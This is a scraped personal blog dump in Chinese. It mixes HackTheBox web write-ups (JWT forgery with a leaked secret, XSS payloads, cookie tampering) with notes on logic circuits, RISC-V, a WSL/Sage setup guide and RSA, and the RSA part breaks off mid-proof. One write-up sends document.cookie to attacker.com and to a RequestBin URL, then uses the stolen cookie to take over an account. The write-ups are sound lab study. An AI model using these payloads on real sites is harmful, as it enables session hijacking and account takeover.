里找到这部分内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061async function generateJWT() &#123; const existingToken = getCookie(&quot;session_token&quot;); if (existingToken) &#123; console.log(&quot;Session token already exists:&quot;, existingToken); return; &#125; const randomNumber = Math.floor(Math.random() * 10000); const guestUsername = &quot;guest_&quot; + randomNumber; const header = &#123; alg: &quot;HS256&quot;, typ: &quot;JWT&quot;, &#125;; const payload = &#123; username: guestUsername, iat: Math.floor(Date.now() / 1000), &#125;; const secretKey = await crypto.subtle.importKey( &quot;raw&quot;, new TextEncoder().encode(&quot;halloween-secret&quot;), &#123; name: &quot;HMAC&quot;, hash: &quot;SHA-256&quot; &#125;, false, [&quot;sign&quot;], ); const headerBase64 = btoa(JSON.stringify(header)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const payloadBase64 = btoa(JSON.stringify(payload)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const dataToSign = `$&#123;headerBase64&#125;.$&#123;payloadBase64&#125;`; const signatureArrayBuffer = await crypto.subtle.sign( &#123; name: &quot;HMAC&quot; &#125;, secretKey, new TextEncoder().encode(dataToSign), ); const signatureBase64 = btoa( String.fromCharCode.apply( null, new Uint8Array(signatureArrayBuffer), ), ) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const token = `$&#123;dataToSign&#125;.$&#123;signatureBase64&#125;`; document.cookie = `session_token=$&#123;token&#125;; path=/; max-age=$&#123;60 * 60 * 24&#125;; Secure`; console.log(&quot;Generated JWT Session Token:&quot;, token); &#125; 可以发现这里是把 halloween-secret 作为密钥进行签名的。继续阅读源码，可以在 scr/routes/index.js 里发现： 12345678910111213141516171819202122232425262728router.get(&quot;/tickets&quot;, async (req, res) =&gt; &#123; const sessionToken = req.cookies.session_token; if (!sessionToken) &#123; return res.status(401).json(response(&quot;No session token provided&quot;)); &#125; try &#123; const username = getUsernameFromToken(sessionToken); if (username === &quot;admin&quot;) &#123; try &#123; const tickets = await db.get_tickets(); return res.status(200).json(&#123; tickets &#125;); &#125; catch (err) &#123; return res .status(500) .json(response(&quot;Error fetching tickets: &quot; + err.message)); &#125; &#125; else &#123; return res .status(403) .json(response(&quot;Access denied. Admin privileges required.&quot;)); &#125; &#125; catch (err) &#123; return res.status(400).json(response(err.message)); &#125;&#125;); 也就是说 /tickets 页面只会验证我们的username是否等于admin。 并且flag就在这个页面里，因为对应的database的内容为： 1234567891011121314151617181920212223242526async migrate() &#123; let flag; fs.readFile(&quot;/flag.txt&quot;, &quot;utf8&quot;, function (err, data) &#123; flag = data; &#125;); await this.db.exec(` DROP TABLE IF EXISTS tickets; CREATE TABLE tickets( id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(255) NOT NULL, username VARCHAR(255) NOT NULL, content TEXT NOT NULL ); `); await this.db.exec(` INSERT INTO tickets (name, username, content) VALUES (&#x27;John Doe&#x27;, &#x27;guest_1234&#x27;, &#x27;I need help with my account.&#x27;), (&#x27;Jane Smith&#x27;, &#x27;guest_5678&#x27;, &#x27;There is an issue with my subscription.&#x27;), (&#x27;Admin&#x27;, &#x27;admin&#x27;, &#x27;Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter $&#123;flag&#125;&#x27;), (&#x27;Paul Blake&#x27;, &#x27;guest_9012&#x27;, &#x27;Can someone assist with resetting my password?&#x27;), (&#x27;Alice Cooper&#x27;, &#x27;guest_3456&#x27;, &#x27;The app crashes every time I try to upload a picture.&#x27;); `); &#125; 渗透首先确认一下这个密钥是否正确： 然后将username的值改为”admin”，再利用这个新的JWT访问 /tickets 。 这个网站不知道为什么突然不能修改jwt了，所以写段python手动修改： 1234567891011121314import jwtoriginal_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0XzE3ODgiLCJpYXQiOjE3NDM2MDk3MDd9.RrHUnCE8lcYjM0m2LZQDYM46uqrberxslMW_FNtm49s&quot;secret = &quot;halloween-secret&quot;algorithm = &quot;HS256&quot;decoded_payload = jwt.decode(original_token, secret, algorithms=[algorithm])decoded_payload[&quot;username&quot;] = &quot;admin&quot;new_token = jwt.encode(decoded_payload, secret, algorithm=algorithm)print(&quot;\\n新的 Token:&quot;)print(new_token) 得到flag：HTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"}]},{"title":"HTB Phantom Script Writeup","slug":"CTF/Web/HTB-Phantom-Script-Writeup","date":"2025-04-02T11:56:01.000Z","updated":"2025-04-02T21:32:11.467Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","excerpt":"","text":"题目描述 （有附件，但完全不需要。） 观察打开网页： 注意右边的这段代码： 123456789101112searchInput.addEventListener(&#x27;input&#x27;, function () &#123; const query = searchInput.value; if (query.trim() !== &quot;&quot;) &#123; const filteredArticles = filterArticles(query); searchResultsHeading.innerHTML = `Results for: &quot;$&#123;query&#125;&quot;`; searchResultsHeading.style.display = &#x27;block&#x27;; renderArticles(filteredArticles); &#125; else &#123; searchResultsHeading.style.display = &#x27;none&#x27;; renderArticles(articles); &#125;&#125;); 这里会直接提取我们的输入赋值给 query，并且将query直接拼接进HTML的代码里了。 网页右下角那里还给了些基础xss的例子： 但是尝试 1&lt;script&gt;alert(&#x27;Boo!&#x27;);&lt;/script&gt; 会失败，有可能是那里自动过滤了。 渗透尝试其他Payload即可： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 检测到注入成功了便会自动显示flag。 得到flag：HTB{xS5_iS_34SY_wh4t_d0_you_th1nk?} 。 讲一下这里注入成功的原理： 这是我们注入的内容： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 当我们在html里写 1&lt;img src=&quot;valid_image.jpg&quot;&gt; 的时候浏览器会自动去加载图片。但是我们这里故意写了个无效的地址1&lt;img src=x&gt; 所以加载时会触发error，然后 onerror 里的内容会被当作 JavaScript 执行。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB OnlyHacks Writeup","slug":"CTF/Web/HTB-OnlyHacks-Writeup","date":"2025-04-02T07:38:35.000Z","updated":"2025-04-02T21:32:07.040Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 注册个账号试试：（注意这里一定要上传一个头像，不然会一直提示用户名重复） 进去之后会显示4个人，我们每个都点一下绿色的心（在dating app里应该是心动的意思）： 然后点进右上角的Mathces： 会发现只有一个对话框。 对话里没有什么有用的信息，但是我们注意到它好像是每隔一段时间（大概5到10秒左右）才会看一次我们的消息并回复，跟一般XSS的环境很像。 我们查看当前的cookie会发现： 通过base64解码会发现这个应该是通过cookie识别我们登录的身份的。（后面的乱码部分是python的flask的session自带的签名） 渗透通过XSS获取管理员身份并登录他的账号。 首先在 https://requestbin.kanbanbox.com/ 上创建一个RequestBin： 正常XSS攻击的模板是： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 所以我们将我们在RequestBin创建的url放进去然后在聊天框发送： 1&lt;script&gt;fetch(&quot;https://requestbin.kanbanbox.com/xckrydxc?cookie=&quot; + document.cookie); &lt;/script&gt; 之后在RequestBin页面点击右上角的青色图标那里： 就可以查看收到的cookie内容： 1eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE 之后在浏览器里修改我们的cookie再刷新网页： 可以看到我们成功登录了她的账号，还能看到我们刚才发送的消息。 flag就在另一个对话里：HTB{d0nt_trust_str4ng3r5_bl1ndly} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"}]},{"title":"逻辑电路图","slug":"TUM info 笔记/ERA/逻辑电路图","date":"2025-03-31T20:35:54.000Z","updated":"2025-04-26T18:30:34.156Z","comments":true,"path":"2025/03/31/TUM info 笔记/ERA/逻辑电路图/","permalink":"https://archer-baiyi.github.io/2025/03/31/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/","excerpt":"","text":"逻辑门先来认识（记）一下基础的逻辑门： 注意，NAND，NOR那里的那个小圆圈代表的是取反（negation），跟最底下的Negation是一个效果。 比如这里表达的是 $y = \\neg (a \\wedge \\neg b) $ ： 一般情况下堵在逻辑门出入口的圆圈指的是取反，而下面这种只是表示线路连接而已： 不要弄混了。 加法（Addition）半加器（Der Halbaddierer ，HA）半加器的目的是计算2个bit的加法，输出也为2个bit，即： 1234 a0+ b0------s1 s0 也可以用数学公式表达： \\begin{align*} ha: B^2 &\\to B^2 \\\\ (a_0,b_0) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0 \\end{align*}对应的真值表则是： \\begin{array}{cc|cc} a_0 & b_0 & s_1 & s_0 \\\\ \\hline 0 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 1 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 1 & 0 \\\\ \\end{array}也就是说 s_0 = a_0 \\text{ xor } b_0 s_1 = a_0 \\wedge b_0对应的逻辑电路图： 左边是and，右边是xor。在之后的内容里用HA指代半加器。 Kosten和Tiefe分别是：C(HA) = 2, Depth(HA) = 1。 全加器（Der Volladdierer ，FA）全加器的目的是计算3个bit的加法，输出为2个bit，即： 12345 a0+ b0+ c------s1 s0 其中c是进位信息。 对应的数学表达： \\begin{align*} fa: B^3 &\\to B^2 \\\\ (a_0,b_0,c) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0+c \\end{align*}真值表： \\begin{array}{ccc|cc} a_0 & b_0 & c & fa_1 & fa_0 \\\\ \\hline 0 & 0 & 0 & 0 & 0 \\\\ 0 & 0 & 1 & 0 & 1 \\\\ 0 & 1 & 0 & 0 & 1 \\\\ 0 & 1 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 0 & 1 \\\\ 1 & 0 & 1 & 1 & 0 \\\\ 1 & 1 & 0 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 1 \\\\ \\end{array}注意到： s_0 = a_0 \\text{ xor } b_0 \\text{ xor } c = ha_0(c,ha_0(a_0,b_0))\\\\ \\begin{align*} s_1 &= a_0 \\wedge b_0 \\vee c \\wedge (a_0 \\text{ xor } b_0 )\\\\ &= ha_1(a_0,b_0) + ha_1(c,ha_0(a_0,b_0)) \\end{align*}（ha0表示2个数相加得到的s0位的值，ha1同理。） 逻辑电路图： Kosten和Tiefe分别是：C(HA) = 5, Depth(HA) = 3。 选择器（Multiplexer，MUX）选择器正如字面意思，会从2个数里选择一个数。数学表达： \\begin{align*}sel_n: B^{2n+} &\\to B^{n} \\\\ (a_{n-1}, \\ldots, a_0, b_{n-1}, \\ldots, b_0, s) &\\mapsto \\begin{cases} (a_{n-1} \\ldots a_0), & \\text{falls } s = 1 \\\\ (b_{n-1} \\ldots b_0), & \\text{falls } s = 0 \\end{cases} \\end{align*}注意到： (sel_n)_i = (s \\wedge a_i) \\vee (\\neg s \\wedge b_i)逻辑电路图： 后续一般用这个符号指代： 存储（Speichern）RS-Latch / RS-FlipFlop 真值表： \\begin{array}{cc|cc} R & S & Q(t) & \\neg Q(t) \\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) \\\\ 0 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 0 & 0 \\\\ \\end{array}D-Latch / D-FlipFlop （设上面 and 的结果为S，下面 and 的结果为R，跟RS-Latch的位置一样。） 真值表： \\begin{array}{cc|cc|cc} D & E & Q(t) & \\neg Q(t) & R & S\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 1 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 0 & 1 & 0 & 1 & 1 & 0\\\\ 1 & 1 & 1 & 0 & 0 & 1\\\\ \\end{array}2*2 Bit Speicher （write位等于0代表读，等于1代表写；灰色的是选择器；上面的2个黄色部分是Adresse=0的结果，下面的是Adresse=1的。） Inkrementer自增器主要用于比如说更新程序计数器（Program counter），需要到达的效果类似： 1add pc, pc, 4 需要2个步骤，计算加法并且存储结果。所以对应的逻辑电路为： RISC-V Single-Cycle Prozessor先解释一下所有需要的部件： Program Counter (PC)： Instruktionsspeicher：存储所有需要执行的指令 Registerbank： 会处理所有的寄存器。其中A1，A2是操作里的寄存器的地址，RD1和RD2是这两个寄存器里的具体内容。A3和WD3是第3个寄存器（存储计算结果的）。只有当WE3=1的时候才会写入第三个寄存器。 Arithmetic Logic Unit (ALU)： 详细版： ALU会进行所有的逻辑运算。ALUControl这个参数会指定执行具体哪项操作（如ADD, AND, SUB 等，以3 bit的格式）。注意，最后一个bit的内容（即 $\\text{ALUControl}_0$）会传递给上面的Sum以及Sum上面的那个MUX。 比如： 000表示加法； 001表示减法 010表示AND； 011表示OR； 101表示进行是否等于0的判断。 Datenspeicher： CLK表示系统内的计时器。A 是需要读取或者加载的地址。RD是读取到的信息（Read Data），WD是需要写入的信息（Write Data）。只有当WE=1的时候才会写入。 完整的RISC-V Single-Cycle Prozessor的结构： 解释一下每个参数： PCSrc：决定当前地址，是继续下去还是回到返回地址。 0表示回到之前的地址继续 1表示在现在的地址基础上继续。 ResultSrc：决定当前输出。 如果是lw之类的操作，需要设为01，因为需要将读取到的信息存入结果寄存器（RD -&gt; WD3）。 如果是R-Type之类的操作，则需要设为00。 MemWrite：决定当前是否要写入到Memory中。 0表示不写入； 1表示写入。 ALUControl：决定当前的ALU操作 add, and, sub 之类的R-Type操作直接设为操作本身就好（以3 bit的格式）； lw, sw需要设为add，因为需要通过加法计算地址； beq等需要设为sub，因为这里判断a和b是否相等是通过直接传递a-b的计算结果实现的。 ALUSrc：决定当前是使用的第二个寄存器还是立即数（imm）。 0表示使用第二个寄存器的内容； 1表示使用imm。 ImmSrc：决定当前读取imm的格式，因为每种Type的指令存储imm的格式都不一样。 RegWrite：决定当前结果是否需要写入第3个寄存器。 0表示不写入； 1表示写入。 ControlUnit的部分构造稍微再具体一点是这样的： 一些常见操作的参数例子： x表示不重要。比如说在 jal 那里，jump 的参数会被设为1，这个1会和 (zero AND Branch) 进行 or 操作，所以结果一定是1，也就意味着 Branch的结果在这个情况下无关紧要。 RISC-V Multicycle Prozessor 只用了一个硬件存储指令以及数据，并且加了很多个CLK，将整个流程拆成了很多步。 在Singlecycle里，takt的时间需要考虑最复杂的指令执行所需要的时间，比如说load之类的操作比其他的操作要久很多，所以整体看下来很亏，因为需要将就这种操作。 但在Multicycle里，会将每个操作拆成好多步，takt的时间只需要设置成这些步骤中最长的时间即可。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"}]},{"title":"如何在wsl里安装sage","slug":"CTF/如何在wsl里安装sage","date":"2025-03-31T12:44:34.000Z","updated":"2025-04-01T22:01:41.291Z","comments":true,"path":"2025/03/31/CTF/如何在wsl里安装sage/","permalink":"https://archer-baiyi.github.io/2025/03/31/CTF/%E5%A6%82%E4%BD%95%E5%9C%A8wsl%E9%87%8C%E5%AE%89%E8%A3%85sage/","excerpt":"","text":"一共分成2个步骤： 安装Miniforge（Anaconda的轻量化替代品） 通过Anaconda安装sage 下载vscode的wsl版（可选） 安装Miniforge1wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh 然后安装脚本： 1bash Miniforge3-Linux-x86_64.sh 如果安装时询问你是否要把它加入 .bashrc， 选择是，这样一来每次打开wsl它都会自动启动并进入base环境，会比较方便。 当然如果这个自启没有设置成功，也可以手动设置： 先打开 .bashrc 编辑器 1nano ~/.bashrc 在文件末尾添加： 12. &quot;$HOME/miniforge3/etc/profile.d/conda.sh&quot;conda activate base 然后使用 Ctrl + o 和 Ctrl + x 保存并退出。 最后再运行： 1source ~/.bashrc 安装sage通过 1conda create -n sage sage -c conda-forge 安装sage。然后每次使用 1conda activate sage 激活sage环境并用 1sage 打开sage。 下载vscode的wsl版由于单纯用命令行运行sage代码不太方便，并且只用sage的话有些python的命令（比如说连接服务器等）容易出问题，可以安装一个vscode的wsl版。 首先在Windows里的vscode下载 wsl 的插件 之后在当前wsl的命令行里输入： 12code .# 用vscode打开当前文件夹 它便会开始自动下载wsl版的vscode。 下载完成后，每次启动wsl之后只需要先打开vscode： 1code . 然后在vscode的命令行里输入： 1conda activate sage 便可以编写并运行import了sage库的python代码。 记住要先开vscode再开启sage的环境，不然先开启了sage环境后，进到vscode里会掉回base的环境！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"}]},{"title":"HTB Full Stack Conf Writeup","slug":"CTF/Web/HTB-Full-Stack-Conf-Writeup","date":"2025-03-30T10:40:40.000Z","updated":"2025-04-02T21:31:39.305Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 渗透因为提示用alert，并且题目描述里提到了JavaScript，所以直接尝试最简单的JavaScript注入： 1&lt;script&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 得到flag：HTB{p0p..p0p..p0p...alert(1337)} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB baby auth Writeup","slug":"CTF/Web/HTB-baby-auth-Writeup","date":"2025-03-30T10:24:26.000Z","updated":"2025-04-02T21:31:50.592Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站： 注册个账号然后登录试试： 查看当前cookie： 这段内容base64解码可以得到： 123eyJ1c2VybmFtZSI6IjEyMyJ9&#123;&quot;username&quot;:&quot;123&quot;&#125; 渗透将cookie改成 1&#123;&quot;username&quot;:&quot;admin&quot;&#125; 的base64，即 1eyJ1c2VybmFtZSI6ImFkbWluIn0= 修改cookie然后刷新网页： 得到flag：HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"}]},{"title":"RSA加解密以及攻击方法","slug":"CTF/Crypto/RSA加解密以及攻击方法","date":"2025-03-29T19:01:56.000Z","updated":"2025-06-03T19:31:38.049Z","comments":true,"path":"2025/03/29/CTF/Crypto/RSA加解密以及攻击方法/","permalink":"https://archer-baiyi.github.io/2025/03/29/CTF/Crypto/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"RSA加/解密首先设 \\varphi(m) := | \\{ 1 \\leq k \\leq m ｜\\gcd(k, m) = 1 \\} |为欧拉函数（Euler’sche Phi-function）。 RSA加密算法的初始化流程如下： 选择2个很大的质数$p, q$. 计算$n:=pq$。这里的n是公开的，$p, q$则是保密的。 计算$\\varphi(n)$。（因为我们知道$n=pq$，且$p, q$均为质数，我们可以利用公式$\\varphi(n)=(p-1)(q-1)$进行快速计算。） 选择$e \\in \\{1,2,…,\\varphi(n)-1\\}$，使得$gcd(\\varphi(n),e)=1$. 我们的公钥为$(e,n)$。 计算密钥$d$，满足$ed \\equiv 1$ mod $\\varphi(n)$. 用扩展欧几里得算法找到 $x$ 和 $y$，使得： e \\cdot x + \\varphi(n) \\cdot y = 1, 上式中，$x$ 模 $\\varphi(n)$ 的值即为 $d$： d \\equiv x \\bmod \\varphi(n).如果 $d &lt; 0$，需要将其调整到正数范围： d = d + \\varphi(n). 公钥：$n, e$ 私钥：$d$ 假设明文内容为$m$，密文为$c$，加密： c=m^e \\text{ mod } n, \\ \\ \\ \\ a,b \\in \\mathbb{Z}_n.解密： m=c^d \\text{ mod } n.如此一来，任何人都可以将一段信息加密后发送给我们，而只有我们能够解密这段信息。 注意：在RSA加解密中我们默认明文$m$是一个小于$n$的数。 而我们这样计算出来的密钥d之所以可以成功解密信息是基于以下理论： 欧拉定理（Euler Theorem）：设 $n$ 是一个正整数，$a$ 是一个与 $n$ 互素的整数（即 $(a, n) = 1$），$\\varphi$ 是欧拉函数。那么 a^{\\varphi(n)} \\equiv 1 \\ \\ \\ \\text{mod} \\ n.完整加解密代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes # 将string转换成大整数from math import gcddef modinv(e, phi): # 扩展欧几里得算法计算模逆 def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) x, _ = extended_gcd(e, phi) return x % phip = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)e = 65537 # 大部分默认使用这个e的值assert gcd(e, phi) == 1d = modinv(e, phi)# 加密def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# 解密def decrypt(cipher_int, d, n): m = pow(cipher_int, d, n) message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, d, n) RSA-CRTPEM 格式（Privacy Enhanced Mail）RSA 的密钥（无论是私钥还是公钥）在保存或传输时，通常会被先序列化成二进制格式（如 DER），然后再用 Base64 编码，再加上头尾标记（如 ——-BEGIN PUBLIC KEY——-），形成一种叫 PEM 的文本格式。 我们有2种比较好用的方法来生成/解析PEM内容： Python使用 cryptography 库： 生成生成私钥： 123456789101112131415161718192021222324252627282930313233343536373839from cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serializationfrom Crypto.Util.number import getPrimee = 65537p = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)d = pow(e, -1, phi)# 计算 CRT 参数# 这些参数必须传（库要求的）dmp1 = d % (p - 1)dmq1 = d % (q - 1)iqmp = pow(q, -1, p)# 构造私钥对象private_numbers = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=rsa.RSAPublicNumbers(e=e, n=n))private_key = private_numbers.private_key()# 导出为 PEM 格式（PKCS#8）pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption())# 打印 PEM 私钥print(pem.decode()) 然后可以从里面提取公钥： 123456public_key = private_key.public_key()pem_pub = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)print(pem_pub.decode()) 解析解析私钥： 123456789101112131415161718192021222324from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----......-----END PRIVATE KEY-----&quot;&quot;&quot;# 解析 PEM 私钥对象private_key = serialization.load_pem_private_key( pem_data, password=None # 如果加密了，需要提供密码（bytes）)# 提取私钥参数（适用于 RSA 密钥）numbers = private_key.private_numbers()# 打印出 RSA 私钥参数print(f&quot;Modulus (n): &#123;numbers.public_numbers.n&#125;&quot;)print(f&quot;Public Exponent (e): &#123;numbers.public_numbers.e&#125;&quot;)print(f&quot;Private Exponent (d): &#123;numbers.d&#125;&quot;)print(f&quot;Prime 1 (p): &#123;numbers.p&#125;&quot;)print(f&quot;Prime 2 (q): &#123;numbers.q&#125;&quot;)print(f&quot;d mod (p-1): &#123;numbers.dmp1&#125;&quot;)print(f&quot;d mod (q-1): &#123;numbers.dmq1&#125;&quot;)print(f&quot;q^-1 mod p: &#123;numbers.iqmp&#125;&quot;) # 用于CRT的 解析公钥： 123456789101112from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----......-----END PUBLIC KEY-----&quot;&quot;&quot;key = serialization.load_pem_public_key(pem_data)# 提取公钥的详细信息numbers = key.public_numbers()print(f&quot;Modulus (n): &#123;numbers.n&#125;&quot;)print(f&quot;Exponent (e): &#123;numbers.e&#125;&quot;) 攻击质因数分解nFermat’s Factorization这种方法适用于p和q的大小差不多的情况。 算法原理：我们先来看一个引理：引理 1 如果 $n$是一个奇正整数，那么将$n$分解为两个正整数的乘积，与将其表示为两个平方数之差之间存在一一对应关系。 证明： 设n是一个奇正整数，且$ n = ab$，其中$a$和$b$是两个正的奇整数。那么$n$可以表示为两个平方数之差： n = ab = s^2 - r^2,其中，$r = \\frac{a - b}{2}$，$s = \\frac{a + b}{2}$。反过来，如果$n$是两个平方数之差，即$n = s^2 - r^2$，那么我们可以将其因式分解为： n = (s - r)(s + 